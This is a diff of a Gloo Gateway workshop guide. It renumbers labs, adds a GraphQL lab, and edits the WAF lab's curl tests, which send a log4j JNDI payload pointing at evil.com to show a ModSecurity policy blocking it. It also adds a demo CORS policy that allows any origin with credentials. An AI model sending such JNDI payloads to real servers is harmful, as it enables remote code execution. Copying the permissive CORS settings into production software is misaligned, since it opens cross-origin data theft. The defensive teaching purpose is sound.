@@ -26,11 +26,12 @@ You can find more information about Gloo Gateway in the official documentation:
 * [Lab 3 - Deploy Online Boutique Sample Application](#onlineboutique)
 * [Lab 4 - Expose Online Boutique](#expose)
 * [Lab 5 - Routing](#routing)
-* [Lab 6 - Web Application Firewall](#waf)
+* [Lab 6 - Global Policies](#policies)
 * [Lab 7 - Authentication / API Key](#apikey)
 * [Lab 8 - Authentication / JWT + JWKS](#jwt)
 * [Lab 9 - Authentication / OIDC](#oidc)
 * [Lab 10 - Rate Limiting](#ratelimiting)
+* [Lab 11 - Web Application Firewall](#waf)
 * [Lab 11 - GraphQL](#graphql)
 
 ## Begin
@@ -751,8 +752,7 @@ spec:
 EOF
 ```
 
-1. Configure the RateLimitPolicy
-
+2. Configure the RateLimitPolicy
 ```yaml
 kubectl apply -f - <<EOF
 apiVersion: admin.gloo.solo.io/v2
@@ -798,13 +798,13 @@ spec:
 EOF
 ```
 
-2. Test Rate Limiting
+3. Test Rate Limiting
 
 ```sh
 for i in {1..6}; do curl -iksS -H "x-api-key: developer" -X GET https://$GLOO_GATEWAY_HTTPS/products | tail -n 10; done
 ```
 
-3. Expected Response
+4. Expected Response
 
 ```sh
 HTTP/2 429
@@ -828,7 +828,7 @@ In this section of the lab, take a quick look at how to prevent the `log4j` expl
 2. Confirm that a malicious JNDI request currently succeeds. Note the `200` success response. Later, you create a WAF policy to block such requests.
 
 ```sh
-curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://$GLOO_GATEWAY/products
+curl -ik -X GET -H "x-api-key: developer" -H "User-Agent: \${jndi:ldap://evil.com/x}" https://$GLOO_GATEWAY_HTTPS/products
 ```
 
 3. With the Gloo WAF policy custom resource, you can create reusable policies for ModSecurity. Review the `log4j` WAF policy and the frontend route table. Note the following settings.
@@ -865,7 +865,7 @@ EOF
 
 ```sh
 # Products API
-curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://$GLOO_GATEWAY/products
+curl -ik -X GET -H "x-api-key: developer" -H "User-Agent: \${jndi:ldap://evil.com/x}" https://$GLOO_GATEWAY_HTTPS/products
 
 # Currency API
 curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://$GLOO_GATEWAY/currencies
@@ -887,6 +887,223 @@ Your applications are no longer susceptible to `log4j` attacks, nice!
 
 
 ## Lab 12 - Graphql<a name="graphql"></a>
+
+GraphQL is an open-source data query language for APIs that is growing in popularity among enterprises seeking to simplify client-server interactions. It provides a powerful and flexible alternative to standards like OpenAPI for requesting data from microservices applications via declarative data fetching, with a client specifying exactly what data it needs from an API and underlying services through a single endpoint.
+
+Although GraphQL provides a consistent and predictable API, the code, time, and effort required to build the GraphQL server to respond to requests can be considerable, requiring developers to write specific libraries for caching, security, rate-limiting, failover, and many other functions.
+
+In this section, we will begin our exploration of using Gloo Platform to publish GraphQL APIs without the need for a dedicated, backend GraphQL server.
+
+* To enable graphql we are going to add a demo `CORSPolicy` to make communicating with the GraphQL easy
+```yaml
+kubectl apply -f -<<EOF
+apiVersion: security.policy.gloo.solo.io/v2
+kind: CORSPolicy
+metadata:
+  name: cors-policy
+  namespace: online-boutique
+spec:
+  applyToRoutes:
+  - route:
+      labels:
+        ingress: all
+  config:
+    allowCredentials: true
+    allowHeaders:
+    - content-type
+    allowMethods:
+    - POST
+    allowOrigins:
+    - regex: '.*'
+EOF
+```
+
+1. Since we already have HTTP based APIs, we can offer these APIs as GraphQL ones with some simple Gloo Platform Configuration. First lets define two GraphQL queries `ListProducts` and `GetProduct` that will call their respective HTTP apis. 
+
+```yaml
+kubectl apply -f -<<EOF
+apiVersion: apimanagement.gloo.solo.io/v2
+kind: GraphQLResolverMap
+metadata:
+  name: products
+  namespace: online-boutique
+spec:
+  types:
+    Query:
+      fields:
+        ListProducts:
+          resolvers:
+          - restResolver:
+              destinations:
+              - port:
+                  number: 3555
+                ref:
+                  cluster: cluster-1
+                  name: productcatalogservice
+                  namespace: online-boutique
+              request:
+                headers:
+                  :method:
+                    json: GET
+                  :path:
+                    json: /products
+        GetProduct:
+          variables:
+            productVar:
+              graphqlArg: id
+            resolverResultVar:
+              resolverResult: {}
+          resolvers:
+          - restResolver:
+              destinations:
+              - port:
+                  number: 3555
+                ref:
+                  cluster: cluster-1
+                  name: productcatalogservice
+                  namespace: online-boutique
+              request:
+                headers:
+                  :method:
+                    json: GET
+                  :path:
+                    jq: '"/products/id/" + (.productVar | tostring)'
+EOF
+```
+
+2. Secondly we need to define GraphQL schemas for these queries. Below is an `ApiDoc` reference for the products API.
+
+```yaml
+kubectl apply -f -<<EOF
+apiVersion: apimanagement.gloo.solo.io/v2
+kind: ApiDoc
+metadata:
+  name: products
+  namespace: online-boutique
+spec:
+  graphql:
+    schemaDefinition: |-
+      type Price { currency_code: String units: String nanos: Int }
+
+      type Product { 
+        id: String
+        name: String
+        description: String
+        picture: String
+        categories: [String]
+        price_usd: Price
+      }
+
+      type ProductList { products: [Product] }
+
+      type Query {
+        ListProducts: ProductList
+        GetProduct(id: String): Product
+      }
+EOF
+```
+
+3. Finally combine the `APIDoc` and `GraphQLResolverMap` using a `GraphQLSchema` which we then can reference in a `RouteTable`
+```yaml
+kubectl apply -f -<<EOF
+apiVersion: apimanagement.gloo.solo.io/v2
+kind: GraphQLSchema
+metadata:
+  name: products
+  namespace: online-boutique
+spec:
+  resolved:
+    options: 
+      enableIntrospection: true
+    resolverMapRefs:
+    - name: products
+      namespace: online-boutique
+      clusterName: cluster-1
+  schemaRef:
+    name: products
+    namespace: online-boutique
+    clusterName: cluster-1
+---
+apiVersion: networking.gloo.solo.io/v2
+kind: RouteTable
+metadata:
+  name: graphql-routes
+  namespace: online-boutique
+spec:
+  weight: 50
+  workloadSelectors: []
+  http:
+  - name: products
+    graphql:
+      options:
+        logSensitiveInfo: true
+      schema:
+        name: products
+        namespace: online-boutique
+        clusterName: cluster-1
+    matchers:
+    - uri:
+        prefix: /graphql-products
+EOF
+```
+
+4. Navigate to the `APIS` page in the Gloo Platform UI
+```
+meshctl dashboard
+```
+![Gloo Platform APIS](./images/gloo-platform-apis-ui.png)
+
+5. Click on `products-graphql-routes.online-boutique.cluster-1` API
+
+
+6. Click on `Explore API` and then update `Settings` to use the `/graphql-products` prefix.
+
+![GraphQL Settings](./images/graphql-settings.png)
+
+7. Run the following queries to query data
+
+```graphql
+query GetProductQuery {
+  GetProduct(id: "66VCHSJNUP") {
+    categories
+    description
+    id
+    name
+    picture
+    price_usd {
+      currency_code
+      nanos
+      units
+    }
+  }
+}
+```
+
+```graphql
+query ListProductsQuery {
+  ListProducts {
+    products {
+      categories
+      id
+    }
+  }
+}
+```
+
+8. Combine the queries to fetch the data all together
+```graphql
+query CombinedQuery {
+  ListProducts {
+    products {
+      id
+    }
+  }
+  GetProduct(id: "66VCHSJNUP") {
+    description
+    id
+  }
+}
+```
 
 
 * Query for Ads
